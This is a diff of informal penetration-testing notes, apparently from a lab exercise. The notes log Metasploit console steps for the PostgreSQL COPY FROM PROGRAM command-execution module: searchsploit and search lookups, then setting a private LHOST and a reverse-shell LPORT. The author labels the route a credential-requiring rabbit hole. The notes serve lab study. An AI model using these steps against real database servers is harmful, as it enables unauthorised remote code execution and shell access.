@@ -25,7 +25,7 @@ use exploit modules as much as possible.
 
 LHOST comming back through our WAN
 
-[SKIP!!! THIS. TO LINE 38 RABBIT HOLE]
+[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options
 
@@ -39,7 +39,11 @@ LHOST comming back through our WAN
 
 [Found out that you need creds for this route hard stop]
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts 192.168.122.102 [3:29][DAY 11]
+(CALI) searchsploit postgresql (find version) 
+
+(ATK)(msf6) search postgresql
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209 [3:29][DAY 11]
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]
 
